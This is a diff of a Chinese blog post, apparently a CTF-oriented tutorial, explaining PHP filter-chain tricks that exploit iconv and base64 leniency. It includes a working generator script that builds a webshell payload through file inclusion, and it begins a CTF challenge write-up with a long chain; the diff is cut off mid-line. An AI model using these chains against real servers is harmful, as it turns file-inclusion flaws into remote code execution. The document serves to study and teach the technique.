@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E5%85%A5"><span class="toc-text">引入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php-x2F-x2F-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Base64"><span class="toc-text">Base64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%BB%E4%BA%A1%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">死亡代码绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filterchain%E6%9E%84%E9%80%A0"><span class="toc-text">Filterchain构造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E9%87%8D%E5%8E%BB%E6%9D%82"><span class="toc-text">双重去杂</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E5%85%A5"><span class="toc-text">引入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php-x2F-x2F-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Base64"><span class="toc-text">Base64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%BB%E4%BA%A1%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">死亡代码绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filterchain%E6%9E%84%E9%80%A0"><span class="toc-text">Filterchain构造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%80%A71%EF%BC%9A%E5%8F%8C%E9%87%8D%E5%8E%BB%E6%9D%82"><span class="toc-text">特性1：双重去杂</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%80%A72%EF%BC%9A%E7%B2%98%E5%90%88%E6%80%A7"><span class="toc-text">特性2：粘合性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0webshell"><span class="toc-text">构造webshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0"><span class="toc-text">任意字符构造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSRound-7-Team-brokenFilterChain%EF%BC%88%E5%8E%9F%E7%90%86%E8%80%83%E5%AF%9F%EF%BC%89"><span class="toc-text">[NSSRound#7 Team]brokenFilterChain（原理考察）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#idekCTF-2022-Paywall%EF%BC%88%E5%AE%9E%E6%88%98%E8%BF%90%E7%94%A8%EF%BC%89"><span class="toc-text">[idekCTF 2022]Paywall（实战运用）</span></a></li></ol>
     </div>
   
         
@@ -246,7 +246,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/PHP/" style="color: #ff7d73">PHP</a>
+                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #ff7d73">文件包含</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/PHP/" style="color: #00bcd4">PHP</a>
             </span>
             
         </span>
@@ -260,7 +265,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.3k字</span>
+        <span class="post-count">4.2k字</span>
       </span>
     </span>
 
@@ -269,7 +274,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">5分</span>
+        <span class="post-count">20分</span>
       </span>
     </span>
     
@@ -289,6 +294,7 @@
 <p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8">https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8</a></p>
 <p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH</a></p>
 <span id="more"></span>
 
 <hr>
@@ -345,7 +351,7 @@ php<span class="token punctuation">:</span><span class="token comment">//filter/
 <p><img src="/blog/2023/11/24/FilterChain/image-20231124213402669.png" alt="image-20231124213402669"></p>
 <p>那么，结合我们上述提到的编码、文件内容，我们是不是可以利用一些固定的文件内容来产生 webshell 呢？</p>
 <p>结合 PHP Base64 宽松性，即使我们使用其他字符编码产生了不可见字符，我们也可以利用 <code>convert.base64-decode</code> 来去掉非法字符，留下我们想要的字符</p>
-<h2 id="双重去杂"><a href="#双重去杂" class="headerlink" title="双重去杂"></a>双重去杂</h2><p>注：需要在linux环境下运行php脚本</p>
+<h2 id="特性1：双重去杂"><a href="#特性1：双重去杂" class="headerlink" title="特性1：双重去杂"></a>特性1：双重去杂</h2><p>注：需要在linux环境下运行php脚本</p>
 <p>demo：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$content1</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,bbb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -364,11 +370,164 @@ php<span class="token punctuation">:</span><span class="token comment">//filter/
 <p><img src="/blog/2023/11/24/FilterChain/image-20231124214911455.png" alt="image-20231124214911455"></p>
 <p>经过从<code>UTF-8-&gt;CSISO2022KR</code>后，bbb变成了七个字节，为什么只显示)Cbbb是因为其余的是不可见字符,16进制解码一下</p>
 <p><img src="/blog/2023/11/24/FilterChain/image-20231124215527247.png" alt="image-20231124215527247"></p>
-<p>这里就要介绍filter第一个特性了，也就是强制显示（<code>convert.base64-decode</code>的时候忽略了无效字符）</p>
+<p>这里就要介绍filter第一个特性了，也就是<strong>强制显示</strong>（<code>convert.base64-decode</code>的时候忽略了无效字符）</p>
 <p>拿上述输出结果中的第二条数据来看，我们已经看到了第一条输出结果中16进制是什么字符串</p>
 <p>而对于base64来说有效字符只有<code>Cbbb</code>，<code>convert.base64-decode</code>的时候解码出的虽然是乱码，但是只有3个字符，符合 base64 解码<code>4-&gt;3</code>的规则</p>
-<p>现在看第三条，我们只是base64编码了回去，但是此时的输出结果只有4个字节，实现了去除CSISO2022KR的字符，同时还原了一个字符C</p>
+<p>现在看第三条，我们只是base64编码了回去，但是此时的输出结果只有4个字节，实现了去除CSISO2022KR的字符，这就是<strong>去杂</strong>，同时还构造出了一个字符C</p>
 <hr>
+<h2 id="特性2：粘合性"><a href="#特性2：粘合性" class="headerlink" title="特性2：粘合性"></a>特性2：粘合性</h2><p>demo：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$content1</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4/resource=data://,bbb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$content2</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,bbb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$content3</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode/resource=data://,bbb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$content1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$content1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"=========================================="</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$content2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$content2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"=========================================="</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$content3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$content3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/24/FilterChain/image-20231125142319193.png" alt="image-20231125142319193"></p>
+<p>观察一下，</p>
+<p>第一条的输出结果多构造出了个字符<code>1</code>，第二条的输出结果是前一个特性中的那条，第三条的输出结果是在第二条的基础上再加上第一条的过滤器，得到的结果是在首位构造出了字符<code>1</code>，然后其他的往后推移了一位，这样就把构造出的<code>1</code>和<code>C</code>连接在了一起</p>
+<p>那么如果能构造26个字母以及所有数字，是不是理论上就可以通过这个filterchain获取任意的语句了？</p>
+<p>这就是粘合性：构造出的字符可以拼贴在一起</p>
+<hr>
+<h2 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h2><p>以这个payload为例</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`$_GET[0]`</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>以上 payload 的 base64 编码为 <code>PD89YCRfR0VUWzBdYDs7Pz4=</code> ，而如果只使用了一个分号，则编码结果为 <code>PD89YCRfR0VUWzBdYDs/Pg==</code> ，这里用两个分号主要还是为了避免找斜杠</p>
+<p>然后逐个字符反推出这个base64编码后的payload</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$base64_payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"PD89YCRfR0VUWzBdYDs7Pz4"</span><span class="token punctuation">;</span>
+<span class="token variable">$conversions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token string single-quoted-string">'R'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'B'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'C'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'8'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'9'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'f'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'s'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'z'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'U'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'P'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'V'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'0'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'Y'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'W'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'d'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'D'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'7'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2'</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'4'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$filters</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"convert.base64-encode|"</span><span class="token punctuation">;</span>
+<span class="token comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+<span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.iconv.UTF8.UTF7|"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">str_split</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$base64_payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token variable">$conversions</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span>
+    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-decode|"</span><span class="token punctuation">;</span>
+    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-encode|"</span><span class="token punctuation">;</span>
+    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.iconv.UTF8.UTF7|"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-decode"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$final_payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filters</span><span class="token punctuation">&#125;</span></span>/resource=data://,aaaaaaaaaaaaaaaaaaaa"</span><span class="token punctuation">;</span>
+
+<span class="token comment">// echo $final_payload;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$final_payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/24/FilterChain/image-20231125144211539.png" alt="image-20231125144211539"></p>
+<p>可以看到经过编码去杂拼接之后得到了我们的payload关键部分</p>
+<p>从上面的例子可以看到，这个攻击技巧需要我们提前把所有单字符的编码形式给 fuzz 出来，而且 fuzz 的结果还要有一定的技巧性，并不是所有出现了合法字符的编码形式就是符合要求的</p>
+<p>假设我们要找的字符为 x，我们要找的字符编码形式要求为：</p>
+<ul>
+<li>x 必须在最终生成的字符串的前端</li>
+<li>字符串前端的字符当中，最好的情况是允许存在仅且唯一一个 x 对于 PHP Base64 来说合法的字符。当然这里可以允许存在其他合法字符，但是对于 fuzz 来说通用性并不强，当确实没办法找到单个字符的时候可以使用多个字符来代替。</li>
+</ul>
+<hr>
+<h1 id="任意字符构造"><a href="#任意字符构造" class="headerlink" title="任意字符构造"></a>任意字符构造</h1><p>大佬们的fuzz及generate脚本：</p>
+<p>探姬：<a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/filter-Chain-tools/tree/main">https://github.com/ProbiusOfficial/filter-Chain-tools/tree/main</a></p>
+<p>wupco：<a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p>
+<p>remsio-syn：<a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<p>这里用探姬的工具进行演示</p>
+<p>res文件夹都是fuzz的结果，都是生成对应字母的filterchain</p>
+<p>在iconv_list.php中定义fuzz需要的字符集，根据环境下的<code>iconv -l</code>来选择我们需要的字符集</p>
+<p>开始fuzz</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php Fuzzer.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>生成filterchain，有两种模式：1. res文件夹中原有的hexcode编码字母的链子生成；2. dictionary.py中的字典生成</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python Generator.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="NSSRound-7-Team-brokenFilterChain（原理考察）"><a href="#NSSRound-7-Team-brokenFilterChain（原理考察）" class="headerlink" title="[NSSRound#7 Team]brokenFilterChain（原理考察）"></a>[NSSRound#7 Team]brokenFilterChain（原理考察）</h1><p>拿到一个php附件</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode |convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode |convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode |convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode |convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode |convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode |convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode |convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode |convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode |convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode |convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode |convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode |convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode |convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode |convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode |convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode |convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode |convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode |convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode |convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode |convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode |convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode |convert.iconv.ISO-2022-KR.UTF16|convert.iconv.ISO-IR-139.UTF-16|convert.iconv.ISO-IR-157.ISO-IR-156|convert.iconv.WINDOWS-1258.ISO_6937|convert.iconv.KOI8-T.ISO-2022-JP-3|convert.iconv.CP874.ISO2022KR|convert.iconv.CSUNICODE.UTF-8|convert.iconv.OSF00010004.UTF32BE|convert.base64-decode|convert.base64-encode |convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode |convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode |convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode |convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode |convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode |convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode |convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode |convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode |convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode |convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode |convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode |convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode |convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode |convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode |convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode |convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode |convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode |convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode |convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode |convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode |convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode |convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode |convert.base64-decode/resource=data://,nsssssssssssssssctfiss0000000fun"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter 